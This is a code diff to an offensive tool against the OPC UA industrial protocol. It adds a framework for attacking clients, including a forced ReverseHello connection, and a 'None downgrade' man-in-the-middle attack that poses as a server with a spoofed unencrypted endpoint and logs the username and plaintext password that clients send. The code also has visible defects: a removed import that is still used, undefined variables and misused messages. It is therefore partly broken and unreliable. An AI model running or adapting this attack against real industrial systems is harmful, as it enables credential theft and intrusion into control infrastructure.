@@ -7,7 +7,6 @@ from messages import *
 from message_fields import *
 from typing import *
 from crypto import *
-from datetime import datetime
 from socket import socket, create_connection, SHUT_RDWR
 from random import Random, randint
 from enum import Enum, auto
@@ -1541,3 +1540,210 @@ def auth_check(url : str, skip_none : bool, demo : bool):
     
   inject_cn_attack(url, TEMPLATE_APP_URI, False, demo)
   
+# While acting as a server, read an OPC message from a client.
+def read_client_msg(sock : socket, msg_type : Type[OpcMessage]) -> OpcMessage:
+  with sock.makefile('rb') as sockio:
+    msg = msg_type()
+    msg.from_bytes(sockio)
+    return msg
+
+# Same for writing.
+def write_client_msg(sock : socket, msg : OpcMessage):
+  with sock.makefile('wb') as sockio:
+    msg.to_bytes(sockio)
+    sockio.flush()
+    
+# A client attack is a coroutine that receives client connection sockets.
+ClientAttack = Generator[None, socket, None]
+      
+# Sets up and executes an attack against an OPC client instead of a server. 
+# Also capable of forcing a client connection via ReverseHello, in which case the listen address is used as an 
+# endpointUri in the Reversehello message.
+def client_attack(
+    attacker : ClientAttack, 
+    listen_host : str, listen_port : int,
+    revhello_addr  : Optional[Tuple[str, int]] = None,
+    persist : bool = False
+  ):
+    if revhello_addr is None:
+      # Start listening for client connection.
+      listener = socket.create_server((listen_host, listen_port))
+      log(f'Started listening for an incoming client connections on {listen_host}:{listen_port}.')
+      def clientsocker():
+        clientsock, peeraddr = listener.accept()
+        log_success(f'Received a connection from {":".join(peeraddr)}.')
+        return clientsock
+    else:
+      server_uri = server_eps[0].server.applicationUri
+      revurl = f'opc.tcp://{listen_host}:{listen_port}/'
+      def clientsocker():
+        log(f'Connecting to client {":".join(revhello_addr)}...')
+        clientsock = socket.create_connection(revhello_addr)
+        log(f'Connected. Now sending ReverseHello with server URI "{server_uri}" and endpoint URL "{revurl}".')
+        write_client_msg(clientsock, ReverseHelloMessage(
+          severUri=server_uri,
+          endpointUrl=revurl,
+        ))
+        return clientsock
+      
+    firstround = True
+    while firstround or persist:
+      try:
+        while True:
+          attacker.send(clientsocker())
+      except StopIteration:
+        firstround = False
+    
+    if revhello_addr is None:
+      listener.shutdown(socket.SHUT_RDWR)
+      listener.close()
+
+
+# None downgrade password stealer.
+def nonegrade_mitm(server_url : str) -> ClientAttack:
+  # First try connecting to the server.
+  server_eps = get_endpoints(server_url)
+  log(f'Got {len(server_eps)} server endpoints from {server_url}.')
+  
+  # Make a spoofed endpoint with None security that only accepts passwords. 
+  # Base this on an existing endpoints, preferably those similar to what we want.
+  spoofed_ep = max(server_eps, key=lambda ep: ep.securityPolicyUri == SecurityPolicy.NONE)
+  spoofed_policy = max(spoofed_ep.userIdentityTokens, default=None, lambda p: p.tokenType == UserTokenType.USERNAME)
+  if not spoofed_policy or spoofed_policy.tokenType != UserTokenType.USERNAME:
+    spoofed_policy = userTokenPolicy.create(
+      policyId='1',
+      tokenType=UserTokenType.USERNAME,
+      issuedTokenType=None,
+      issuerEndpointUrl=None,
+      securityPolicyUri=SecurityPolicy.NONE,
+    )
+  else:
+    spoofed_policy = spoofed_policy._replace(securityPolicyUri=SecurityPolicy.NONE)
+  spoofed_ep = spoofed_ep._replace(
+    securityPolicyUri=SecurityPolicy.NONE,
+    userIdentityTokens=[spoofed_policy]
+  )
+  
+  # Creates a simple response header based on a request.
+  def simple_respheader(reqheader):
+    return responseHeader.create(
+      timeStamp=datetime.now(),
+      requestHandle=reqheader.requestHandle,
+      serviceResult=0,
+      serviceDiagnostics=None,
+      stringTable=[],
+      additionalHeader=None,
+    )
+  
+  # Server loop.
+  while True:
+    clientsock = yield
+  
+    # Get hello.
+    hello = read_client_msg(clientsock, HelloMessage)
+    log('Received Hello message from client.')
+    
+    # Reflect buffer sizes in Ack.
+    write_client_msg(clientsock, AckMessage(**{name: getattr(hello, name) for name, _ in AckMessage.fields}))
+    
+    # Next should be an unencrypted OPN.
+    opn = read_client_msg(clientsock, OpenSecureChannelMessage)
+    log('Received OpenSecureChannel from client.')
+    if opn.securityPolicyUri != SecurityPolicy.NONE:
+      raise AttackNotPossible(f'OPN from client has unexpected security policy {opn.securityPolicyUri}.')
+    
+    # Send an OPN response initiating an unencrypted channel.
+    opnconv, _ = encodedConversation.from_bytes(opn.encodedPart)
+    opnreq, _ = openSecureChannelRequest.from_bytes(opnconv)
+    token = channelSecurityToken.create(
+      channelId=1,
+      tokenId=1,
+      createdAt=datetime.now(),
+      revisedLifetime=opnreq.requestedLifetime,
+    )
+    write_client_msg(clientsock, OpenSecureChannelMessage(
+      secureChannelId=opn.secureChannelId + 1,
+      securityPolicyUri=SecurityPolicy.NONE,
+      senderCertificate=None,
+      receiverCertificateThumbprint=None,
+      encodedPart=encodedConversation.to_bytes(encodedConversation.create(
+        sequenceNumber=opnconv.sequenceNumber,
+        requestId=opnconv.requestId,
+        requestOrResponse=openSecureChannelResponse.to_bytes(openSecureChannelResponse.create(
+          responseHeader=simple_respheader(opnreq.requestHeader),
+          serverProtocolVersion=0,
+          securityToken=token,
+          serverNonce=None,
+        ))
+      ))
+    ))
+    
+    # Response message helper.
+    def responder(reqmsg, resptype, **data):
+      convo, _ = encodedConversation.from_bytes(reqmsg.encodedPart)
+      write_client_msg(clientsock, ConversationMessage(
+        securityChannelId=token.channelId,
+        tokenId=token.tokenId,
+        encodedPart=encodedConversation.to_bytes(encodedConversation.create(
+          sequenceNumber=req_convo.sequenceNumber,
+          requestId=req_convo.requestId,
+          requestOrResponse=resptype.to_bytes(resptype.create(
+            responseHeader=simple_respheader(reqmsg.requestHeader),
+            **data
+          )),
+        ))
+      ))
+  
+    # Expecting either GetEndpoints or CreateSession from the client next.
+    convomsg1 = read_client_msg(clientsock, ConversationMessage)
+    convo1, _ = encodedConversation.from_bytes(convomsg1.encodedPart)
+    try:
+      ep_req, _ = getEndpointsRequest.from_bytes(convo1.requestOrResponse)
+    except DecodeError:
+      ep_req = None
+    
+    if ep_req:
+      # Respond with the spoofed endpoint.
+      log('Received GetEndpointsRequest. Responding with spoofed (unencrypted password demanding) endpoint.')
+      responder(convomsg1, getEndpointsResponse, endpoints=[spoofed_ep])
+    else:
+      csr, _ = createSessionRequest.from_bytes(convo1.requestOrResponse)
+      log('Received CreateSessionRequest.')
+      responder(convomsg1, createSessionResponse,
+        sessionId=NodeId(9,1234),
+        authToken=NodeId(9,1235),
+        revisedSessionTimeout=csr.requestedSessionTimeout,
+        serverNonce=None,
+        serverCertificate=spoofed_ep.serverCertificate,
+        serverEndpoints=[spoofed_ep],
+        serverSoftwareCertificates=[],
+        serverSignature=signatureData.create(algorithm=None,signature=None),
+        maxRequestMessageSize=csr.maxResponseMessageSize,
+      )
+      
+      # Finally consume ActivateSessionRequest.
+      convomsg2 = read_client_msg(clientsock, ConversationMessage)
+      convo2, _ = encodedConversation.from_bytes(convomsg1.encodedPart)
+      asr, _ = activateSessionRequest.from_bytes(convo2.requestOrResponse)
+      log_success('Received unencrypted ActivateSessionResponse from client.')
+      if asr.userIdentityToken.policyId != spoofed_policy.policyId:
+        raise AttackNotPossible(f'Client picked unexpected policy ID: {asr.userIdentityToken.policyId}')
+        
+      log_success(f'Username: {asr.userIdentityToken.userName}')
+      if asr.userIdentityToken.encryptionAlgorithm:
+        log('However, password is still encrypted.')
+      else:
+        pwd = asr.userIdentityToken.password.decode(errors="replace")
+        log_success(f'Password: {pwd}')
+  
+      # Kill this connection and end the attack round.
+      clientsock.shutdown(socket.SHUT_RDWR)
+      clientsock.close()
+      return
+
+# # MitM attack that uses the chunk dropping attack to modify signed endpoint info to trick a client into exposing its 
+# # password.
+# # If tcp_resets is True intentional connection interruptions will be introduced to make a client accept gaps even when
+# # it is strictly enforcing https://reference.opcfoundation.org/Core/Part6/v104/docs/6.7.2.4
+# def chunkdrop_mitm(server_url : str, tcp_resets : bool) -> ClientAttack:
+#   
